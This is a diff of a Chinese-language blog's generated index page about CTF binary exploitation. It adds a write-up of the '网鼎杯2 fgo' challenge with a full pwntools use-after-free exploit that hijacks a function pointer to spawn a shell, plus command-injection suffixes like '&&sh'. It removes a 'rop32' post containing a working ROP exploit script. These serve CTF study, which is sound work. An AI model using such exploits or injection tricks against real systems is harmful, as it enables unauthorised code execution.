@@ -79,7 +79,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -89,6 +89,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/09/02/网鼎杯2-fgo/">网鼎杯2(fgo)</a>
+          </li>
         
           <li>
             <a href="/2018/09/02/ISG/">ISG</a>
@@ -106,10 +110,6 @@
             <a href="/2018/08/30/ISG-babynote/">ISG(babynote)</a>
           </li>
         
-          <li>
-            <a href="/2018/08/28/FILE结构/">FILE结构</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -119,7 +119,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆攻击模型/">堆攻击模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆攻击模型/">堆攻击模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -151,6 +151,56 @@
 </aside>
         
         <section id="main">
+  
+    <article id="post-网鼎杯2-fgo" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/02/网鼎杯2-fgo/" class="article-date">
+  <time datetime="2018-09-02T03:51:36.000Z" itemprop="datePublished">2018-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/02/网鼎杯2-fgo/">网鼎杯2(fgo)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/liu/1t/u18/\xe6\x96\x87\xe6\xa1\xa3/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf/\xe7\x8e\x8b\xe9\xbc\x8e2/fgo/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>got表可写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------------</span><br><span class="line"> 1. Add servant           </span><br><span class="line"> 2. Delete servant        </span><br><span class="line"> 3. Print servant         </span><br><span class="line"> 4. Exit</span><br></pre></td></tr></table></figure></p>
+<p>提供了add，delete，print，函数(没有edit)。</p>
+<p>add功能：<br>nodelist在bss段。每个node存放在一个chunk（size=0x10）里，chunk[0]=<em>put   chunk[2]=</em>content  congent的chunk可以自由分配。<br>最多可以申请5个node。</p>
+<p>free函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( servantlist[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  free(*((void **)servantlist[v1] + 1));</span><br><span class="line">  free(servantlist[v1]);</span><br><span class="line">  puts(&quot;Success &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>删除之后指针没有清零，count也没有减，最多add 5次</p>
+<p>程序里面给出了system(“/bin/sh”)函数，目的就是劫持程序执行流，让程序执行它。<br>看一个完整的node<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x9b9b000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 17, </span><br><span class="line">  fd = 0x804862b &lt;print_servant_content&gt;, </span><br><span class="line">  bk = 0x9b9b018, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x9b9b010 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 57, </span><br><span class="line">  fd = 0xa41, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也就是说当调用show的时候会调用<code>fd = 0x804862b &lt;print_servant_content&gt;</code>地址处的函数，这个地址完全可以设置为system(“/bin/sh”)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">system_addr=0x08048956</span><br><span class="line">bss_addr=0x0804B050</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Add(size,concent):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;the size of servant&apos;s name : \n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;ability : \n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(concent)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Success !\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Delete(ID):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Success \n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Print(id):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#x /10xw 0x0804B050</span><br><span class="line"></span><br><span class="line">Add(0x30,&quot;A&quot;)</span><br><span class="line">Add(0x30,&quot;b&quot;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">Delete(0)</span><br><span class="line">Delete(1)</span><br><span class="line"></span><br><span class="line">Add(8,p32(system_addr))</span><br><span class="line">Print(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>有一点需要注意删除的时候顺序是先0后1申请的时候就是先1后0，让伪造的chunk0来执行show。</p>
+<p>思考：<br>这里介绍了有2层chunk的利用方法.<br>其实堆溢漏洞的普遍利用方法就是想办法申请到控制chunk的内容。<br>注意控制chunk中数据原本的含义。</p>
+<p>堆漏洞利用的根本就是申请到原本有意义的空间然后修改这些值达到自己的目的。不用拘泥于double free，unlink等方法。</p>
+<p>本题没有system函数也能getshell不过需要system参数截断。<br>&amp;&amp;sh，类似的还有||sh，;sh; 都可以达到system(/bin/sh)的效果，不过只有四个字节，比较好用。<br>参考链接<a href="https://blog.csdn.net/qq_35429581/article/details/78231443" target="_blank" rel="noopener">https://blog.csdn.net/qq_35429581/article/details/78231443</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/02/网鼎杯2-fgo/" data-id="cjlkqx3cd000fmel3fvlr6via" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-ISG" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -191,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/02/ISG/" data-id="cjlkb7auw00006il3qbbql4al" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/09/02/ISG/" data-id="cjlkqx3c70008mel3kg0tieyb" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
@@ -233,7 +283,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/01/hose-of-lore/" data-id="cjlkb7aw9000e6il3g8feffg6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/09/01/hose-of-lore/" data-id="cjlkqx3c40003mel32qxr4ue1" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/堆攻击模型/">堆攻击模型</a></li></ul>
@@ -296,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/31/堆中获取地址和劫持执行流的方法/" data-id="cjlkb7aw6000b6il3r7eegazh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/31/堆中获取地址和劫持执行流的方法/" data-id="cjlkqx3c60005mel3x9gyw9p8" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a></li></ul>
@@ -351,7 +401,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/30/ISG-babynote/" data-id="cjlkb7awe000m6il327gmd9p8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/30/ISG-babynote/" data-id="cjlkqx3ch000mmel39ujbpnz5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a></li></ul>
@@ -398,7 +448,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/28/FILE结构/" data-id="cjlkb7av300016il3uybv85cr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/28/FILE结构/" data-id="cjlkqx3bx0000mel327it4vqe" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
@@ -479,7 +529,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/26/网鼎杯-教育/" data-id="cjlkb7awb000g6il3s9e12r1k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/26/网鼎杯-教育/" data-id="cjlkqx3cc000dmel3yso2uc0d" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
@@ -532,7 +582,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/26/极客巅峰/" data-id="cjlkb7aw8000c6il3xg6o1zol" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/26/极客巅峰/" data-id="cjlkqx3cb000bmel3rpjzp5zf" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
@@ -615,7 +665,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/" data-id="cjlkb7av700036il3quft983p" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/" data-id="cjlkqx3c90009mel3tfyhv2p9" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a></li></ul>
@@ -661,50 +711,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/21/通用gatget/" data-id="cjlkb7awc000h6il3gl5169pe" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-rop32" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/21/rop32/" class="article-date">
-  <time datetime="2018-08-21T10:13:05.000Z" itemprop="datePublished">2018-08-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/21/rop32/">rop32</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="蒸米哥的一步一步学rop"><a href="#蒸米哥的一步一步学rop" class="headerlink" title="蒸米哥的一步一步学rop"></a>蒸米哥的一步一步学rop</h1><p><strong>下面讲一下32为系统溢出注意点</strong><br>测试软件地址<a href="https://github.com/tower111/softwroe.git" target="_blank" rel="noopener">https://github.com/tower111/softwroe.git</a></p>
-<p>反编译结果是</p>
-<p><img src="http://i2.bvimg.com/659021/6e33bef6136422fa.png" alt=""></p>
-<p>漏洞很明显了  这里只开了NX保护。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;./level2&quot;)</span><br><span class="line">plt_write=elf.plt[&quot;write&quot;]</span><br><span class="line">plt_read=elf.plt[&apos;read&apos;]</span><br><span class="line">vulfun_addr=0x0804842D</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    payload1=&quot;a&quot;*140+p32(plt_write)+p32(vulfun_addr)+p32(1)+p32(address)+p32(4)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data=p.recv(4)</span><br><span class="line">    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">p=process(&quot;./level2&quot;)</span><br><span class="line">#p=remote(&quot;127.0.0.1&quot;,1000)</span><br><span class="line">d=DynELF(leak,elf=ELF(&apos;./level2&apos;))</span><br><span class="line">system_addr=d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line">print &quot;system_addr=&quot;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a018</span><br><span class="line"></span><br><span class="line">pppr=0x080484bd</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*140+p32(plt_read)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8)</span><br><span class="line">payload+=p32(system_addr)+p32(vulfun_addr)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>这就是payload<br><strong>用pop来平衡堆栈，执行ret的时候rsp指向的位置的值会被执行（执行ret指针会移动）</strong><br>为什么要这样调整堆栈平衡呢，这就和调用约定有关了。程序每次返回都会调整自己的堆栈，把堆栈调整到call之前。<br><img src="http://i2.bvimg.com/659021/e9a28bdace20bcc0.png" alt="image0003"><br>在这里体现出来就是leave和retn指令而程序返回之后在call外面把堆栈调整回来（不过这里图没有add esp而是直接利用了上次函数调用的时候分配出来的栈）<br><img src="http://i2.bvimg.com/659021/5f9173be7ce5af08.png" alt="image0004"><br>每个call只会负责call出来的时候堆栈是平衡的，而让传进去的参数维持平衡只能靠外层函数。</p>
-<p>所以我们构造payload需要找到三个pop来平衡堆栈而调用多少个pop就要看原来有多少个参数，需要谨记的一点就是无论什么时候ret都是把返回地址从esp里面弹出来。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/21/rop32/" data-id="cjlkb7av900046il3pkrqk507" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/21/通用gatget/" data-id="cjlkqx3ce000hmel3e21390ay" class="article-share-link">Share</a>
       
       
     </footer>
